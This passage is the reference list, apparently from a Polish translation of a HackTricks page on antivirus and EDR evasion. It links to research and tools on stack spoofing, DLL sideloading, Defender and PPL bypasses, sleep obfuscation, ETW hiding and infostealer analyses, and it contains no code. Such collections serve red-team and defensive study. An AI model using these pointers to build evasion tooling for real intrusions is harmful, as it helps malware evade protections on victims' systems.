- [7] [simplehook – przykład](https://tradecraftgarden.org/simplehook.html)
- [8] [stackcutting – przykład](https://tradecraftgarden.org/stackcutting.html)
- [9] [Draugr – PIC do spoofingu stosu wywołań](https://github.com/NtDallas/Draugr)
- [10] [Unit42 – Nowy łańcuch infekcji i zaciemnianie kodu oparte na ConfuserEx w przypadku DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [11] [Synacktiv – Czy można ufać zasadzie zero trust? Omijanie kontroli stanu urządzenia Zscaler](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [12] [Check Point Research – Przed ToolShell: analiza wcześniejszych operacji ransomware Storm-2603](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [13] [Hexacorn – DLL ForwardSideLoading: nadużywanie eksportów przekazywanych dalej](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [14] [Spis eksportów przekazywanych dalej w Windows 11 (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [15] [Microsoft Learn – Kolejność wyszukiwania bibliotek DLL](https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order)
- [16] [Microsoft Learn – Zabezpieczenia procesów i prawa dostępu](https://learn.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights)
- [17] [Microsoft – Dokumentacja EKU (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [18] [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [19] [Uruchamiacz CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [20] [Zero Salarium – Odpieranie EDR dzięki ochronie Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [21] [Zero Salarium – Przełamywanie osłony Windows Defender za pomocą techniki przekierowania folderu](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [22] [Microsoft – Dokumentacja polecenia mklink](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)
- [23] [Check Point Research – Za czystą kurtyną: od RAT-a przez buildera po programistę](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [24] [Rapid7 – SantaStealer nadchodzi: nowy, ambitny infostealer](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
- [25] [ChromElevator – deszyfrowanie Chrome App-Bound Encryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)
- [26] [Check Point Research – GachiLoader: zwalczanie malware Node.js za pomocą śledzenia API](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)
- [27] [Śpiąca królewna: usypianie Adaptix za pomocą Crystal Palace](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty/)
- [28] [SensePost – Zatruwanie parametrów procesu](https://sensepost.com/blog/2026/process-parameter-poisoning/)
- [29] [Orange Cyberdefense – p3-loader](https://github.com/Orange-Cyberdefense/p3-loader)
- [30] [Śpiąca królewna II: CFG, CET i spoofing stosu](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty-ii)
- [31] [Zaciemnianie uśpienia Ekko](https://github.com/Cracked5pider/Ekko)
- [32] [SysWhispers4 – GitHub](https://github.com/JoasASantos/SysWhispers4)
- [33] [blog.xpnsec.com – Ukrywanie ETW w Dotnet](https://blog.xpnsec.com/hiding-your-dotnet-etw)
- [34] [repnz/etw-providers-docs](https://github.com/repnz/etw-providers-docs)
- [35] [trustedsec.com – Nadużywanie Chrome Remote Desktop podczas operacji Red Team: praktyczny przewodnik](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide)
- [36] [Check Point Research – BTR Reforged: wykorzystanie sterownika naprawczego Defendera jako prymitywu operacji na jądrze](https://research.checkpoint.com/2026/btr-reforged-weaponizing-defenders-remediation-driver-as-a-kernel-operation-primitive/)
- [37] [Dump-GUY – BTR_CLI](https://github.com/Dump-GUY/BTR_CLI)
- [38] [Kod towarzyszący MDSec Function Peekaboo](https://github.com/mdsecactivebreach/functionpeekaboo)
- [39] [MDSec – Function Peekaboo: tworzenie samomaskujących się funkcji za pomocą LLVM](https://mdsec.co.uk/2025/10/function-peekaboo-crafting-self-masking-functions-using-llvm/)
- [40] [Microsoft Learn – VirtualProtect](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect)
- [41] [TwoSevenOneT – kod źródłowy InjectSetConsole](https://github.com/TwoSevenOneT/InjectSetConsole)
- [42] [Microsoft Learn – Funkcja CreatePipe](https://learn.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-createpipe)
- [43] [Microsoft Learn – Tworzenie procesu potomnego z przekierowanym wejściem i wyjściem](https://learn.microsoft.com/en-us/windows/win32/procthread/creating-a-child-process-with-redirected-input-and-output)
- [44] [Praetorian – GhostPack Necromancy: odtwarzanie narzędzi C# za pomocą WasmForge](https://praetorian.com/blog/wasmforge-csharp-ghostpack-edr-evasion)
- [45] [WasmForge – kompilowanie projektów C# / .NET](https://github.com/praetorian-inc/wasmforge/blob/main/docs/CSHARP.md)
- [46] [Proof of concept i kod źródłowy DLLParty](https://github.com/epersic/DLLParty)
- [47] [DLLParty — nadużywanie wewnętrznych mechanizmów puli wątków do wstrzykiwania DLL bez shellcode](https://medium.com/@persic.eno/dllparty-abusing-thread-pool-internals-for-shellcodeless-dll-injection-7c84106f7745)
- [48] [Zbiór danych testowych EMBER2024 i narzędzia thrember](https://github.com/FutureComputing4AI/EMBER2024)
- [49] [Wykorzystanie EMBER2024 do oceny implantów Red Team](https://mez0.cc/posts/evaluating-implants-with-ember/)
- [50] [MSec Operations – Unikanie detekcji opartych na uczeniu maszynowym](https://msecops.de/blog/posts/ml-evasion/)
{{#include ../banners/hacktricks-training.md}}
